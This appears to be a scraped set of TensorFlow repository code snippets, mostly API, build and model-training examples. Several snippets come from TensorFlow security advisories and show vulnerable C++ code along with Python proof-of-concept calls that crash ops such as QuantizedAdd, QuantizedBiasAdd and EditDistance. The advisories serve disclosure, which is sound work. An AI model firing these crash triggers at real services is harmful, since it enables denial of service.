DESCRIPTION: This snippet accesses and displays the prediction tensor for the first sequence in the example batch outputted by the model. This shows the logits for each character at each timestep.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_24

LANGUAGE: python
CODE:
```
example_batch_predictions[0]
```

----------------------------------------

TITLE: Calling Synchronous and Asynchronous Sleep Ops Python
DESCRIPTION: Provides Python examples demonstrating how to invoke the custom synchronous (`SyncSleep`) and asynchronous (`AsyncSleep`) sleep operations defined in C++. It shows the expected output values when the ops are called with a delay of 1.0 seconds, highlighting the difference in the reported sleep time for the asynchronous version.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/sleep/README.md#_snippet_1

LANGUAGE: python
CODE:
```
sleep_op.SyncSleep(1.0)
# tf.Tensor(1.0, shape=(), dtype=float32)
sleep_op.AsyncSleep(1.0)
# tf.Tensor(0.999892, shape=(), dtype=float32)
```

----------------------------------------

TITLE: Transforming Python If Statement with AutoGraph
DESCRIPTION: Illustrates the transformation of a standard Python if statement (`if cond: body else: orelse-body`) into a call to the `ag__.if_stmt` operator. Note the use of state management functions (`get_state`, `set_state`) to handle variables modified within the branches.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/operators.md#_snippet_4

LANGUAGE: Python
CODE:
```
if k > 1:
  j = j + i
```

LANGUAGE: Python
CODE:
```
def get_state():
    return (j, i)

def set_state(vars_):
    nonlocal j, i
    (j, i) = vars_

def body():
    nonlocal j, i
    j = j + i

def orelse():
    pass

ag__.if_stmt(k > 1, body, orelse, get_state, set_state, ('j', 'i'), 1)
```

----------------------------------------

TITLE: Specify TensorFlowLiteC Dependency Version (Podspec)
DESCRIPTION: Sets the dependency version for the `TensorFlowLiteC` pod in a Podspec file, typically referencing a specific stable release version.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_ios.md#_snippet_5

LANGUAGE: Ruby
CODE:
```
s.dependency 'TensorFlowLiteC', "#{s.version}"
```

----------------------------------------

TITLE: One-Hot Encoding Dataset Labels (Python)
DESCRIPTION: Transforms the integer labels for both training and testing datasets into a one-hot encoded format. This function creates a binary vector for each label, where the index corresponding to the original class value is set to 1, which is required for categorical crossentropy loss.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
train_labels = tf.keras.utils.to_categorical(train_labels)
test_labels = tf.keras.utils.to_categorical(test_labels)
```

----------------------------------------

TITLE: Initializing Segmentation Object - TensorFlow Lite Support - Python
DESCRIPTION: This snippet shows the signature for initializing a `Segmentation` object. It requires the height and width of the mask, a list of colored labels, and optionally accepts a NumPy array for the category mask and a list of confidence masks. This object represents a single segmentation result from an image segmenter.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/Segmentation.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.processor.Segmentation(
    height: int,
    width: int,
    colored_labels: List[tflite_support.task.processor.ColoredLabel],
    category_mask: Optional[np.ndarray] = None,
    confidence_masks: Optional[List[ConfidenceMask]] = None
)
```

----------------------------------------

TITLE: Implementing Custom Dense Layer Python
DESCRIPTION: This Python class implements a basic Dense (fully connected) layer. It initializes weights and biases and performs a matrix multiplication followed by an optional activation function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_20

LANGUAGE: python
CODE:
```
class Dense:

  def __init__(self, n_units, activation=None):
    self._n_units = n_units
    self._activation = activation
    self._built = False

  def __call__(self, inputs):
    if not self._built:
      self.build(inputs)
    y = tnp.dot(inputs, self.w) +self.b
    if self._activation != None:
      y = self._activation(y)
    return y

  def build(self, inputs):
    shape_w = (inputs.shape[-1], self._n_units)
    lim = tnp.sqrt(6.0 / (shape_w[0] + shape_w[1]))
    self.w = tf.Variable(tnp.random.uniform(-lim, lim, shape_w).astype(tnp.float32))
    self.b = tf.Variable((tnp.random.randn(self._n_units) * 1e-6).astype(tnp.float32))
    self._built = True

  @property
  def weights(self):
    return (self.w, self.b)
```

----------------------------------------

TITLE: MLIR stablehlo.custom_call with Enum-like Attribute
DESCRIPTION: An example `stablehlo.custom_call` operation in MLIR where an integer attribute (`command`) is used to represent an enum value. This integer value can be automatically decoded into a user-defined C++ enum.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/custom_call.md#_snippet_9

LANGUAGE: MLIR
CODE:
```
%0 = "stablehlo.custom_call"(%arg0) {
  call_target_name = "foo",
  backend_config= {
    command = 0 : i32
  },
  api_version = 4 : i32
} : (tensor<f32>) -> tensor<f32>
```

----------------------------------------

TITLE: Enforcing XLA Execution Determinism (Shell)
DESCRIPTION: This flag forces non-deterministic GPU operations like GEMMs, convolutions, and scatter to use potentially slower, deterministic implementations during XLA program execution. It will cause compilation to fail for operations lacking a deterministic implementation, such as select-and-scatter.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/determinism.md#_snippet_1

LANGUAGE: shell
CODE:
```
--xla_gpu_exclude_nondeterministic_ops
```

----------------------------------------

TITLE: Defining Custom ModelSpec for TF Hub InceptionV3 - Python
DESCRIPTION: Defines a custom ModelSpec object for using the InceptionV3 feature vector model from TensorFlow Hub as the base for transfer learning. It specifies the model's URI and sets the required input image shape [299, 299] for InceptionV3. Requires importing image_classifier.ModelSpec.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_21

LANGUAGE: python
CODE:
```
inception_v3_spec = image_classifier.ModelSpec(
    uri='https://tfhub.dev/google/imagenet/inception_v3/feature_vector/1')
inception_v3_spec.input_image_shape = [299, 299]
```

----------------------------------------

TITLE: Configuring Hermetic GPU Libraries in Bazel WORKSPACE
DESCRIPTION: Provides the necessary Bazel BUILD code snippets to add to a project's WORKSPACE file. These lines load and initialize the repository rules required to download and configure the hermetic CUDA, CUDNN, and NCCL distributions and their dependencies.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/hermetic_cuda.md#_snippet_1

LANGUAGE: Bazel BUILD
CODE:
```
load(
   "@local_xla//third_party/gpus/cuda/hermetic:cuda_json_init_repository.bzl",
   "cuda_json_init_repository",
)

cuda_json_init_repository()

load(
   "@cuda_redist_json//:distributions.bzl",
   "CUDA_REDISTRIBUTIONS",
   "CUDNN_REDISTRIBUTIONS",
)
load(
   "@local_xla//third_party/gpus/cuda/hermetic:cuda_redist_init_repositories.bzl",
   "cuda_redist_init_repositories",
   "cudnn_redist_init_repository",
)

cuda_redist_init_repositories(
   cuda_redistributions = CUDA_REDISTRIBUTIONS,
)

cudnn_redist_init_repository(
   cudnn_redistributions = CUDNN_REDISTRIBUTIONS,
)

load(
   "@local_xla//third_party/gpus/cuda/hermetic:cuda_configure.bzl",
   "cuda_configure",
)

cuda_configure(name = "local_config_cuda")

load(
   "@local_xla//third_party/nccl/hermetic:nccl_redist_init_repository.bzl",
   "nccl_redist_init_repository",
)

nccl_redist_init_repository()

load(
   "@local_xla//third_party/nccl/hermetic:nccl_configure.bzl",
   "nccl_configure",
)

nccl_configure(name = "local_config_nccl")
```

----------------------------------------

TITLE: Initializing CategoryTensorMd Python
DESCRIPTION: Initializes an instance of the `CategoryTensorMd` class. This object serves as a container for metadata specifically for category tensors in TFLite models, inheriting properties from `TensorMd`. It allows configuring the tensor with an optional name, description, and a list of associated label file metadata objects.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/CategoryTensorMd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_writers.metadata_info.CategoryTensorMd(
    name: Optional[str] = None,
    description: Optional[str] = None,
    label_files: Optional[List[LabelFileMd]] = None
)
```

----------------------------------------

TITLE: Modeling Uninstantiated TensorFlow Function with tfg.func (Opaque Types) - MLIR
DESCRIPTION: Illustrates the `tfg.func` operation for modeling uninstantiated TensorFlow functions. It uses opaque `!tfg.tensor` types and shows how multiple results from an operation like `Switch` are accessed using `tfg.get_result` based on named outputs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ir/README.md#_snippet_5

LANGUAGE: MLIR
CODE:
```
  tfg.func generic @foo(%arg0 : !tfg.tensor {tfg.name = "input"},
                        %arg1 : !tfg.tensor {tfg.name = "another_input"})
      -> (!tfg.tensor {tfg.name = "result1"},
          !tfg.tensor {tfg.name = "result2"})
      attributes {description = "function foo"} {
    %Greater, %ctl_0 = tfg.Greater(%arg0, %arg1) name("Greater")
    %G_z = tfg.get_result(%Greater) "z" : 0
    %Switch, %ctl_1 = tfg.Switch(%G_z, %G_z) name("cond/Switch")
    %s_true = tfg.get_result %Switch "output_true" : 0
    %s_false = tfg.get_result %Switch "output_false" : 0
    tfg.return(%s_true, %s_false) [%ctl_0]
  }
```

----------------------------------------

TITLE: Initializing ModelMetadataT from Packed Buffer (Python)
DESCRIPTION: A class method to initialize a `ModelMetadataT` object from a packed buffer (`buf`), optionally specifying a starting position (`pos`). This is likely used for efficient deserialization from a packed byte buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadataT.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
InitFromPackedBuf(
    buf, pos=0
)

```

----------------------------------------

TITLE: Converting Data to/from PjRtBuffer C++
DESCRIPTION: These C++ methods facilitate the transfer of data between host memory (represented by `xla::Literal`) and device memory managed by a PJRT plugin. `BufferFromHostBuffer` is used to create a device `PjRtBuffer` from host data, while `ToLiteral` retrieves the data from a `PjRtBuffer` back to a host `xla::Literal`. They are crucial for providing input arguments to and retrieving results from device computations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/pjrt/cpp_api_overview.md#_snippet_0

LANGUAGE: C++
CODE:
```
absl::StatusOr<std::unique_ptr<PjRtBuffer>> BufferFromHostBuffer(...) {...}
```

LANGUAGE: C++
CODE:
```
xla::PjRtFuture<> ToLiteral(xla::MutableLiteralBase* literal) override {...}
```

----------------------------------------

TITLE: Preprocessing Train Dataset with MoveNet (Python)
DESCRIPTION: Processes the training image dataset to extract pose landmarks using an instance of `MoveNetPreprocessor`. It reads images from `images_in_train_folder` and saves the resulting landmark data and ground truth labels to the specified CSV file, `csvs_out_train_path`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_9

LANGUAGE: Python
CODE:
```
if not is_skip_step_1:
  images_in_train_folder = os.path.join(IMAGES_ROOT, 'train')
  images_out_train_folder = 'poses_images_out_train'
  csvs_out_train_path = 'train_data.csv'

  preprocessor = MoveNetPreprocessor(
      images_in_folder=images_in_train_folder,
      images_out_folder=images_out_train_folder,
      csvs_out_path=csvs_out_train_path,
  )

  preprocessor.process(per_pose_class_limit=None)
```

----------------------------------------

TITLE: Registering SimpleHashTableRemove Op - TensorFlow C++
DESCRIPTION: Registers a TensorFlow custom operation named "Examples>SimpleHashTableRemove". This op takes a resource handle and a key as input and removes the corresponding key-value pair from the associated hash table resource. It requires `key_dtype` and `value_dtype` attributes, though `value_dtype` is not used for an input/output tensor type but is needed by the generated Python wrapper. `SetShapeFn(TwoScalarInputs)` indicates the expected input shapes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_6

LANGUAGE: C++
CODE:
```
REGISTER_OP("Examples>SimpleHashTableRemove")
    .Input("resource_handle: resource")
    .Input("key: key_dtype")
    .Attr("key_dtype: type")
    .Attr("value_dtype: type")
    .SetShapeFn(TwoScalarInputs);
```

----------------------------------------

TITLE: Populating TFLite Model File Metadata - Python
DESCRIPTION: This snippet demonstrates how to pack metadata and associated files into an existing TFLite model file. It initializes the `MetadataPopulator` with the model file path, loads the metadata from a file and associated files from a list of paths, then applies them to the model using the `populate` method. The commented lines show alternative ways to load metadata and associated files directly from byte buffers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataPopulator.md#_snippet_0

LANGUAGE: Python
CODE:
```
# Populating a metadata file (or a metadta buffer) and associated files to
a model file:
populator = MetadataPopulator.with_model_file(model_file)
# For metadata buffer (bytearray read from the metadata file), use:
# populator.load_metadata_buffer(metadata_buf)
populator.load_metadata_file(metadata_file)
populator.load_associated_files([label.txt])
# For associated file buffer (bytearray read from the file), use:
# populator.load_associated_file_buffers({"label.txt": b"file content"})
populator.populate()
```

----------------------------------------

TITLE: Specifying setuptools Dependency with Hashes (Requirements File Syntax)
DESCRIPTION: Defines the `setuptools` package dependency, fixing it to version `70.0.0`. It includes multiple SHA256 hashes for verifying the package source file, ensuring that `pip` installs a known, untampered version when used with hash-checking mode. The comments indicate its origin from `requirements.in` and a `tb-nightly` dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/requirements_lock_3_12.txt#_snippet_15

LANGUAGE: Python
CODE:
```
setuptools==70.0.0 \
    --hash=sha256:54faa7f2e8d2d11bcd2c07bed282eef1046b5c080d1c32add737d7b5817b1ad4 \
    --hash=sha256:f211a66637b8fa059bb28183da127d4e86396c991a942b028c6650d4319c3fd0
    # via
    #   -r ci/official/requirements_updater/requirements.in
    #   tb-nightly
```

----------------------------------------

TITLE: TensorFlow EditDistance Internal OOB Write Logic - C++
DESCRIPTION: This C++ snippet from the `EditDistance` implementation shows the internal logic where the write index `loc` is calculated using `std::inner_product`. The vulnerability lies in the validation `loc < output_elements`, which only checks the upper bound. This allows crafted negative inputs to produce a negative `loc`, resulting in an out-of-bounds write before the intended buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-077.md#_snippet_1

LANGUAGE: C++
CODE:
```
if (g_truth == g_hypothesis) {
  auto loc = std::inner_product(g_truth.begin(), g_truth.end(),
                                output_strides.begin(), int64_t{0});
  OP_REQUIRES(
      ctx, loc < output_elements,
      errors::Internal("Got an inner product ", loc,
                       " which would require in writing to outside of "
                       "the buffer for the output tensor (max elements ",
                       output_elements, ")"));
  output_t(loc) =
      gtl::LevenshteinDistance<T>(truth_seq, hypothesis_seq, cmp);
  // ...
}
```

----------------------------------------

TITLE: Illustrating Heap OOB in TensorFlow Type Inference C++
DESCRIPTION: This C++ snippet from TensorFlow's type inference (`RunForwardTypeInference`) shows the location of a heap OOB read vulnerability. It attempts to access `node_t.args(ix)` using an index `ix` derived from `input_idx[i]`. The crucial bounds check (`ix < node_t.args_size()`) is implemented as a `DCHECK`, which is only active in debug builds, allowing an attacker-controlled `input_idx` to cause an out-of-bounds read in production builds.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-055.md#_snippet_0

LANGUAGE: C++
CODE:
```
if (node_t.type_id() != TFT_UNSET) {
  int ix = input_idx[i];
  DCHECK(ix < node_t.args_size())
      << "input " << i << " should have an output " << ix
      << " but instead only has " << node_t.args_size()
      << " outputs: " << node_t.DebugString();
  input_types.emplace_back(node_t.args(ix));
  // ...
}
```

----------------------------------------

TITLE: Triggering TensorFlow QuantizedAdd Segfault - Python
DESCRIPTION: This Python snippet demonstrates how to trigger the CVE-2022-35967 vulnerability in TensorFlow's `QuantizedAdd` operation. It provides `x` and `y` tensors with specific shapes and `min_x` with a shape of [0], which in affected versions causes a segfault when `tf.raw_ops.QuantizedAdd` is called. Requires a vulnerable version of TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-099.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

Toutput = tf.qint32
x = tf.constant(140, shape=[1], dtype=tf.quint8)
y = tf.constant(26, shape=[10], dtype=tf.quint8)
min_x = tf.constant([], shape=[0], dtype=tf.float32)
max_x = tf.constant(0, shape=[], dtype=tf.float32)
min_y = tf.constant(0, shape=[], dtype=tf.float32)
max_y = tf.constant(0, shape=[], dtype=tf.float32)
tf.raw_ops.QuantizedAdd(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y, Toutput=Toutput)
```

----------------------------------------

TITLE: Demonstrating Vulnerability in TensorFlow Boosted Trees - Python
DESCRIPTION: This Python snippet demonstrates how a negative value for the `num_streams` parameter in the `boosted_trees_create_quantile_stream_resource` operation can trigger a denial of service. Providing a negative integer for this argument causes an implicit conversion to a large unsigned integer in the underlying C++ implementation, leading to excessive memory allocation and a crash. It requires the TensorFlow and NumPy libraries.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-135.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
from tensorflow.python.ops import gen_boosted_trees_ops
import numpy as np

v= tf.Variable([0.0, 0.0, 0.0, 0.0, 0.0])
gen_boosted_trees_ops.boosted_trees_create_quantile_stream_resource(
  quantile_stream_resource_handle = v.handle,
  epsilon = [74.82224],
  num_streams = [-49],
  max_elements = np.int32(586))
```

----------------------------------------

TITLE: Initializing and Running Image Classification in Objective-C
DESCRIPTION: Shows how to initialize the TFLImageClassifier in Objective-C. The code demonstrates importing the necessary header, locating the model file, creating options, initializing the classifier, converting a UIImage to a GMLImage, and executing the classification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_classifier.md#_snippet_4

LANGUAGE: Objective-C
CODE:
```
// Imports
#import <TensorFlowLiteTaskVision/TensorFlowLiteTaskVision.h>

// Initialization
NSString *modelPath = [[NSBundle mainBundle] pathForResource:@"birds_V1" ofType:@"tflite"];

TFLImageClassifierOptions *options =
    [[TFLImageClassifierOptions alloc] initWithModelPath:modelPath];

// Configure any additional options:
// options.classificationOptions.maxResults = 3;

TFLImageClassifier *classifier = [TFLImageClassifier imageClassifierWithOptions:options
                                                                          error:nil];

// Convert the input image to MLImage.
UIImage *image = [UIImage imageNamed:@"sparrow.jpg"];

// There are other sources for GMLImage. For more details, please see:
// https://developers.google.com/ml-kit/reference/ios/mlimage/api/reference/Classes/GMLImage
GMLImage *gmlImage = [[GMLImage alloc] initWithImage:image];

// Run inference
TFLClassificationResult *classificationResult =
    [classifier classifyWithGMLImage:gmlImage error:nil];
```

----------------------------------------

TITLE: Initializing and Running Inference Python TextEmbedder
DESCRIPTION: This Python snippet shows how to initialize the TextEmbedder from a model file using the `create_from_file` class method, run inference on two text inputs to get embedding results, and calculate the cosine similarity between their feature vectors. It relies on the installed `tflite-support` package.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/text_embedder.md#_snippet_2

LANGUAGE: python
CODE:
```
from tflite_support.task import text

# Initialization.
text_embedder = text.TextEmbedder.create_from_file(model_path)

# Run inference on two texts.
result_1 = text_embedder.embed(text_1);
result_2 = text_embedder.embed(text_2);

# Compute cosine similarity.
feature_vector_1 = result_1.embeddings[0].feature_vector
feature_vector_2 = result_2.embeddings[0].feature_vector
similarity = text_embedder.cosine_similarity(
    result_1.embeddings[0].feature_vector, result_2.embeddings[0].feature_vector)
```

----------------------------------------

TITLE: Cross-Build TFLite Pip with Bazel - aarch64 Python 3.5 (Shell)
DESCRIPTION: Invokes the `ci_build.sh` script using the `PI-PYTHON3` profile to prepare a Docker environment for building. Inside Docker, it executes the `build_pip_package_with_bazel.sh` script, targeting the `aarch64` architecture for Python 3.5.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/pip_package/README.md#_snippet_10

LANGUAGE: sh
CODE:
```
tensorflow/tools/ci_build/ci_build.sh PI-PYTHON3 \
  tensorflow/lite/tools/pip_package/build_pip_package_with_bazel.sh aarch64
```

----------------------------------------

TITLE: Defining Python Wrapper for Custom TensorFlow Op
DESCRIPTION: Implements the public Python API for the custom multiplex operation. It serves as a wrapper around the generated C++ op, providing a user-friendly function with type hints, a docstring, and argument descriptions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_2/README.md#_snippet_6

LANGUAGE: python
CODE:
```
def multiplex(cond, a, b, name=None):
  """Return elements chosen from `a` or `b` depending on `cond`.

  This is similar to `np.where` and `tf.where`, but simplified to only handle
  the case of dense tensors, no optional parameters, no broadcasting, etc..

  >>> multiplex([True, False, False, True], [1,2,3,4], [100,200,300,400])
  <tf.Tensor: shape=(4,), dtype=int32, numpy=array([  1, 200, 300,   4], ...)>

  Args:
    cond: tf.Tensor of type bool. Where True, yield `a`, otherwise yield `b`.
    a: tf.Tensor with the same type and shape as `b`.
    b: tf.Tensor with the same type and shape as `a`.
    name: An optional name for the op.

  Returns:
    A tf.Tensor with elements from `a` where `cond` is True, and elements
    from `b` elsewhere.
  """
  return gen_multiplex_2_op.examples_multiplex_dense(
      cond=cond, a=a, b=b, name=name)
```

----------------------------------------

TITLE: Initializing StatsT From Buffer Python
DESCRIPTION: A class method designed to initialize a `StatsT` object by reading data from a provided buffer (`buf`) starting at a specified position (`pos`). This is commonly used for deserializing the object from a serialized data format.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/StatsT.md#_snippet_1

LANGUAGE: Python
CODE:
```
@classmethod
InitFromBuf(
    buf, pos
)
```

----------------------------------------

TITLE: Define EfficientDet-Lite0 Model Spec in Python
DESCRIPTION: This Python snippet shows the function signature for `EfficientDetLite0Spec`, which is used to create a configuration object for training an EfficientDet-Lite0 object detection model with TensorFlow Lite Model Maker. It includes numerous parameters for specifying model source, training epochs, batch size, distribution strategy, and TFLite export settings.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/object_detector/EfficientDetLite0Spec.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.object_detector.EfficientDetLite0Spec(
    *,
    model_name='efficientdet-lite0',
    uri='https://tfhub.dev/tensorflow/efficientdet/lite0/feature-vector/1',
    hparams='',
    model_dir=None,
    epochs=50,
    batch_size=64,
    steps_per_execution=1,
    moving_average_decay=0,
    var_freeze_expr='(efficientnet|fpn_cells|resample_p6)',
    tflite_max_detections=25,
    strategy=None,
    tpu=None,
    gcp_project=None,
    tpu_zone=None,
    use_xla=False,
    profile=False,
    debug=False,
    tf_random_seed=111111,
    verbose=0
)
```

----------------------------------------

TITLE: Creating MetadataWriter from Flatbuffers Objects (Python)
DESCRIPTION: This class method creates a MetadataWriter instance using existing metadata represented as Flatbuffers Python objects. It requires the model buffer and accepts optional metadata for the model, input tensors, output tensors, associated files, and input/output process units, returning a MetadataWriter object for further use.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/image_segmenter/MetadataWriter.md#_snippet_2

LANGUAGE: Python
CODE:
```
@classmethod
create_from_metadata(
    model_buffer: bytearray,
    model_metadata: Optional[<a href="../../../tflite_support/metadata_schema_py_generated/ModelMetadataT"><code>tflite_support.metadata_schema_py_generated.ModelMetadataT</code></a>] = None,
    input_metadata: Optional[List[_metadata_fb.TensorMetadataT]] = None,
    output_metadata: Optional[List[_metadata_fb.TensorMetadataT]] = None,
    associated_files: Optional[List[str]] = None,
    input_process_units: Optional[List[_metadata_fb.ProcessUnitT]] = None,
    output_process_units: Optional[List[_metadata_fb.ProcessUnitT]] = None
)
```

----------------------------------------

TITLE: Calculating Padding Output Size in TFLite C++
DESCRIPTION: This C++ function `ComputeOutSize` is used internally in TFLite kernels to calculate the output dimension size based on input image size, filter size, stride, dilation, and padding type. The function contains a vulnerability where it performs division by the `stride` parameter without checking if `stride` is zero, leading to a division-by-zero error for crafted inputs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-073.md#_snippet_0

LANGUAGE: C++
CODE:
```
inline int ComputeOutSize(TfLitePadding padding, int image_size,
                          int filter_size, int stride, int dilation_rate = 1) {
  int effective_filter_size = (filter_size - 1) * dilation_rate + 1;
  switch (padding) {
    case kTfLitePaddingSame:
      return (image_size + stride - 1) / stride;
    case kTfLitePaddingValid:
      return (image_size + stride - effective_filter_size) / stride;
    default:
      return 0;
  }
}
```

----------------------------------------

TITLE: Demonstrating TensorFlow QuantizedBiasAdd Segfault Vulnerability (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the TFSA-2022-105 segfault vulnerability in `tf.raw_ops.QuantizedBiasAdd`. It shows that providing `min_input`, `max_input`, `min_bias`, and `max_bias` tensors with non-zero ranks (like rank 1) results in a crash or denial of service, as described in the advisory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-105.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

out_type = tf.qint32
input = tf.constant([85,170,255], shape=[3], dtype=tf.quint8)
bias = tf.constant(43, shape=[2,3], dtype=tf.quint8)
min_input = tf.constant([], shape=[0], dtype=tf.float32)
max_input = tf.constant(0, shape=[1], dtype=tf.float32)
min_bias = tf.constant(0, shape=[1], dtype=tf.float32)
max_bias = tf.constant(0, shape=[1], dtype=tf.float32)
tf.raw_ops.QuantizedBiasAdd(input=input, bias=bias, min_input=min_input, max_input=max_input, min_bias=min_bias, max_bias=max_bias, out_type=out_type)
```

----------------------------------------

TITLE: Creating a No-Operation Python-to-Python Transpiler
DESCRIPTION: Defines a `NoopTranspiler` inheriting from `transpiler.PyToPy`. This class serves as a base for Python-to-Python transformations. It overrides `get_caching_key` and `get_extra_locals` (returning default values) and implements `transform_ast` to simply return the input AST unchanged, demonstrating the minimal structure of a `PyToPy` transpiler.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/pyct_tutorial.ipynb#_snippet_8

LANGUAGE: python
CODE:
```
from tensorflow.python.autograph.pyct import transpiler


class NoopTranspiler(transpiler.PyToPy):

  def get_caching_key(self, ctx):
    # You may return different caching keys if the transformation may generate
    # code versions.
    return 0

  def get_extra_locals(self):
    # No locals needed for now; see below.
    return {}

  def transform_ast(self, ast, transformer_context):
    return ast

tr = NoopTranspiler()
```

----------------------------------------

TITLE: Generating Quantization Debug Model (Python)
DESCRIPTION: Modify the standard TFLite full integer quantization steps to produce a debug model. This involves calibrating the model first and then calling `mlir_quantize` with `enable_numeric_verify` set to `True`. This debug model includes both float and quantized ops with `NumericVerify` ops for comparison.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/optimize/debugging/README.md#_snippet_0

LANGUAGE: python
CODE:
```
# for mlir_quantize
from tensorflow.lite.python import convert

# set full-integer quantization parameters as usual.
converter.target_spec.supported_ops = [tf.lite.OpsSet.TFLITE_BUILTINS_INT8]
converter.representative_dataset = calibration_gen

# Create a TFLite model with new quantizer and numeric verify ops. Rather than
# calling convert() only, calibrate model first and call `mlir_quantize` to run
# the actual quantization, with `enable_numeric_verify` set to `True`.
converter.optimizations = [tf.lite.Optimize.DEFAULT]
converter._experimental_calibrate_only = True
calibrated = converter.convert()
return convert.mlir_quantize(calibrated, enable_numeric_verify=True)
```

----------------------------------------

TITLE: Triggering EditDistance Integer Overflow Vulnerability with Python
DESCRIPTION: This Python code snippet demonstrates how to trigger the integer overflow vulnerability in the `tf.raw_ops.EditDistance` operation. It provides parameters, specifically empty lists for `hypothesis_shape` and `truth_shape`, which cause the internal C++ code to attempt an invalid calculation (`NumElements() - 1`) when the input tensor is empty, leading to an integer overflow and potential deadlock. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2023-014.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
para={
    'hypothesis_indices': [[]],
    'hypothesis_values': ['tmp/'],
    'hypothesis_shape': [],
    'truth_indices': [[]],
    'truth_values': [''],
    'truth_shape': [],
    'normalize': False
    }
tf.raw_ops.EditDistance(**para)
```

----------------------------------------

TITLE: Checking Minimum Rank in TensorFlow Shape Inference C++
DESCRIPTION: This C++ snippet from `InferenceContext::WithRankAtLeast` shows the function used to validate the minimum rank of an input shape. It includes a check (`rank > kint32max`) intended to prevent excessively high rank requirements. However, because the `rank` argument is an `int64_t`, a negative value resulting from the vulnerability's type confusion will be less than `kint32max`, allowing the check to be bypassed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-007.md#_snippet_2

LANGUAGE: cpp
CODE:
```
Status InferenceContext::WithRankAtLeast(ShapeHandle shape, int64_t rank,
                                         ShapeHandle* out) {
  if (rank > kint32max) {
    return errors::InvalidArgument("Rank cannot exceed kint32max");
  }
  // ...
}
```

----------------------------------------

TITLE: Checking GPU Compatibility for TFLite Model (Incompatible ops) using Analyzer API (Python)
DESCRIPTION: This snippet shows how to check GPU delegate compatibility using the `gpu_compatibility=True` option. It defines a `tf.function` with operations (`tf.cosh`, `tf.slice` on 2D tensor) known to be incompatible with the GPU delegate. The analysis output will highlight warnings for incompatible nodes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/model_analyzer.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
import tensorflow as tf

@tf.function(input_signature=[
    tf.TensorSpec(shape=[4, 4], dtype=tf.float32)
])
def func(x):
  return tf.cosh(x) + tf.slice(x, [1, 1], [1, 1])

